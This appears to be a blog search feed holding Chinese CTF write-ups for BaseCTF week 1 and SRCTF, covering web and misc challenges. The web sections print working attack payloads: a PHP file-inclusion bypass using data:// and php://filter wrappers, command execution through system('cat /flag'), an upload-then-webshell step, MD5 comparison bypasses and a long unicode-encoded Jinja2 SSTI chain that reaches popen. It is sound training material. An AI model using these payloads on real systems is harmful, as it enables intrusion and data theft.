<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BaseCTF wp(week1)</title>
      <link href="/2024/09/04/BaseCTF_week1/"/>
      <url>/2024/09/04/BaseCTF_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>前端源码有flag</p><h3 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h3><p><img src="/2024/09/04/BaseCTF_week1/1.png" alt="图片"></p><p>得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">QmFzZUNURns4Yzk4MWY0Ny01ZWIwLTQ0ZmMtODJhMy0zZDc5ZDQ4YTlkMWF9Cg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>base64解码即可得flag</p><h3 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>); 这是 Aura 的礼物，你不是 Aura！</span><br></pre></td></tr></table></figure><p>对源码分析，是包含三个判断的文件包含漏洞</p><p>对于第一个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用data伪协议绕过</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">url</span>?pen=<span class="class"><span class="keyword">data</span>://text/plain,<span class="type">Aura</span></span></span><br></pre></td></tr></table></figure><p>第二个判断和第三个判断是同一个参数，合并在一起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以看到challenge既要满足http:<span class="regexp">//</span>jasmineaura.github.io开头，</span><br><span class="line">又要包含中文<span class="string">&quot;已经收到Kengwang的礼物啦&quot;</span>，</span><br><span class="line">仅仅通过data伪协议已经无法满足条件，</span><br><span class="line">所以我们这里使用<span class="variable">@拼</span>接，</span><br><span class="line">在服务器对url解析过程中http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>和http:<span class="regexp">//</span>jasmineaura.github.io<span class="variable">@127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>效果是一样的，</span><br></pre></td></tr></table></figure><p>具体原因参考以下文章：<a href="https://www.freebuf.com/vuls/321535.html">https://www.freebuf.com/vuls/321535.html</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">post</span>传递：challenge=<span class="keyword">http</span>://jasmineaura.github.io@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?pen=data:<span class="regexp">//</span>text/plain,Aura</span><br><span class="line">post: challenge=http:<span class="regexp">//</span>jasmineaura.github.io@<span class="number">127.0</span>.<span class="number">0.1</span>&amp;gift=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>普通的rce</p><p>payload:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?DT=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>无过滤文件上传</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823140250827.png"></p><p>文件路径是&#x2F;uploads，上传成功之后直接连接蚁剑即可</p><h3 id="MD5绕过欸"><a href="#MD5绕过欸" class="headerlink" title="MD5绕过欸"></a>MD5绕过欸</h3><p>简单的md5绕过，贴上最常见的弱比较绕过（0e开头）</p><p>md5弱碰撞</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?<span class="attribute">name</span>=QNKCDZO&amp;name2[]=1</span><br><span class="line">post:<span class="attribute">password</span>=s214587387a&amp;password2[]=2</span><br></pre></td></tr></table></figure><h3 id="Happy-Birthday"><a href="#Happy-Birthday" class="headerlink" title="Happy Birthday"></a>Happy Birthday</h3><p>原题，上传文件发现需要pdf后缀，上传pdf文件发现需要两个文件一起上传，并且要求md5值一样</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150344567.png"></p><p>将两个写有md5弱比较字符串（md5处理后以0e开头）的分别写入两个文件中，并且改写后缀为pdf，即可获得flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150600204.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>basecrak工具梭哈</p><h3 id="根本进不去啊！"><a href="#根本进不去啊！" class="headerlink" title="根本进不去啊！"></a>根本进不去啊！</h3><p>网页访问不了，我们可以查询该域名的解析，使用如下linux命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dig </span>flag.<span class="keyword">basectf.fun </span>txt</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/BaseCTF_week1/image-20240823153236692.png"></p><p>也可借用在线工具：<a href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a></p><h3 id="你也喜欢圣物吗？"><a href="#你也喜欢圣物吗？" class="headerlink" title="你也喜欢圣物吗？"></a>你也喜欢圣物吗？</h3><p>解压发现压缩包需要密码解压，我们唯一的信息就是图片，打开010editor查看图片没有发现有效信息，于是猜想是LSB图片隐写，尝试最经典的红绿蓝三原色最低位隐写，使用Stegsolve打开查看</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823154556566.png"></p><p>得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">key</span><span class="operator">=</span>lud1_lud1</span><br></pre></td></tr></table></figure><p>解压后发现是it is fake.zip，猜测是zip伪加密，使用Winhex修改压缩包的hex编码，将红框位置修改为偶数即可将zip伪加密状态解除</p><img src="/2024/09/04/BaseCTF_week1/Users\ASUS\Desktop\base\img\image-20240823160459730.png" alt="image-20240823160459730" style="zoom: 80%;"><p>最后使用Bandizip打开flag.txt，滚动到最下面即为flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823160542649.png" alt="image-20240823160542649"></p><p>两次base64解码即可获得flag</p><h3 id="倒计时-海报"><a href="#倒计时-海报" class="headerlink" title="倒计时? 海报!"></a>倒计时? 海报!</h3><p>每张海报上面都有flag的一段，只需要仔细看就可以拼凑出来，这里我看不出来，是看了wp才知道用ps对图片进行处理，方便查看</p><img src="/2024/09/04/BaseCTF_week1/image-20240823161430721.png" alt="image-20240823161430721" style="zoom: 67%;"><h3 id="海上遇到了鲨鱼"><a href="#海上遇到了鲨鱼" class="headerlink" title="海上遇到了鲨鱼"></a>海上遇到了鲨鱼</h3><p>用wireshark流量分析，追踪http流即可找到flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823162538242.png"></p><p>手打flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;15ef386b-a3a7-<span class="number">7344</span>-<span class="number">3b05</span>-ac367316fb76&#125;</span><br></pre></td></tr></table></figure><h3 id="正着看还是反着看"><a href="#正着看还是反着看" class="headerlink" title="正着看还是反着看"></a>正着看还是反着看</h3><p>通过010editor打开查看图片，发现图片文件字节末尾有明显的JFIF特征，所以我们可以通过以下脚本来对图片文件字符进行逆序处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_bytes_in_file</span>(<span class="params">input_file_path, output_file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">            content = infile.read()</span><br><span class="line">            reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                outfile.write(reversed_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件内容已成功逆序，并写入到 <span class="subst">&#123;output_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到文件: <span class="subst">&#123;input_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;./flag&#x27;</span> <span class="comment">#要处理的文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;./out&#x27;</span> <span class="comment">#处理完的文件名</span></span><br><span class="line">reverse_bytes_in_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p>处理完之后看下结果，可以看到出现PK字节，明显具有压缩包特征</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823185638530.png"></p><p>我们使用kali工具binwalk进行文件分离，即可得到flag</p><img src="/2024/09/04/BaseCTF_week1/image-20240823185751979.png" alt="image-20240823185751979" style="zoom:50%;"><h3 id="二维码1-街头小广告"><a href="#二维码1-街头小广告" class="headerlink" title="二维码1-街头小广告"></a>二维码1-街头小广告</h3><p>使用QR Research梭哈</p><img src="/2024/09/04/BaseCTF_week1/image-20240823201437242.png" alt="image-20240823201437242" style="zoom:67%;">]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRCTF wp</title>
      <link href="/2024/08/18/SRCTF/"/>
      <url>/2024/08/18/SRCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>考察简单的http请求头知识，具体要求为get传入参数flag&#x3D;1，post传入参数flag&#x3D;1;<br>伪造本地ip的时候可以利用burpsuite爆破，题目下面会附上字典，这里用的是Client-IP:127.0.0.1<br>接着题目提示加入User-Agent: Android和Referer:zzz.mihoyo.com<br>接着是一个新的知识点，如下图<br><img src="/2024/08/18/SRCTF/1.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isset(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]);</span><br><span class="line">//<span class="variable">$_SERVER</span>是一个超全局数组，包含了请求头和服务器信息等信息</span><br><span class="line">//<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]代表了http请求中名为AAA头的值</span><br></pre></td></tr></table></figure><p>根据以上分析，我们只需在请求中添加名为AAA的请求头即可<img src="/2024/08/18/SRCTF/2.png" alt="在这里插入图片描述"></p><p>接着根据提示加上Cookie:xxx&#x3D;1，即可得到flag<br><img src="/2024/08/18/SRCTF/3.png" alt="在这里插入图片描述"></p><h2 id="flag复读机"><a href="#flag复读机" class="headerlink" title="flag复读机"></a>flag复读机</h2><p>上来一个输入框，看到大括号瞬间就可以反应过来是ssti，手打一下，这是最笨的方法</p><img src="/2024/08/18/SRCTF/image-20240829160846524.png" alt="image-20240829160846524" style="zoom: 67%;"><p>fuzz测测它过滤了啥（下图为测试结果）</p><img src="/2024/08/18/SRCTF/image-20240829161007052.png" alt="image-20240829161007052" style="zoom: 80%;"><p>长为205的全是被过滤的，看起来过滤得挺多，但是attr()内置函数和单引号还有管道符没被过滤，那就试试unicode编码绕过（该绕过方式可以解决过滤点和下划线的问题）</p><p>附上unicode编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;&quot;</span> <span class="comment">#需要编码的类名和方法</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>造个paylaod，试试水先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"><span class="comment">#相当于&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161214569.png" alt="image-20240829161214569"></p><p>构造成功，说明思路是对的</p><p>继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f解码出来就是__base__</span></span><br><span class="line"><span class="comment">#整个paylaod相当于&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161315769.png" alt="image-20240829161315769"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(0)相当于.__base__[0]</span></span><br><span class="line"><span class="comment">#attr(&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;)()相当于.__subclasses__()</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161416177.png" alt="image-20240829161416177"></p><p>通过脚本(本题后面会贴上python找类脚本)找到&lt;os._wrap_close&gt;类在137的位置上，继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>))%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161559785.png" alt="image-20240829161559785"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u006c\u0073\u0020\u002f&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161621737.png" alt="image-20240829161621737"></p><p>最终payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;))[&#x27;read&#x27;]()相当于.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span></span><br><span class="line"><span class="comment">#popen被过滤，可用&#x27;po&#x27;&#x27;open&#x27;绕过</span></span><br><span class="line"><span class="comment">#同时/被过滤，将命令cat /flag编码绕过</span></span><br><span class="line"><span class="comment">#由于点被过滤.read()方法无法表达，用()将.read方法包括的范围装在一起，并且通过[&#x27;read&#x27;]绕过对</span></span><br><span class="line">点的过滤，即a[<span class="string">&#x27;read&#x27;</span>]()等效为a.read()</span><br></pre></td></tr></table></figure><p>ssti找类脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;类.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    a = file.read().strip()</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k) + <span class="string">&quot; &quot;</span> + <span class="string">&quot;---&gt;&quot;</span> + v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例文本（由于篇幅问题没有全放）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span 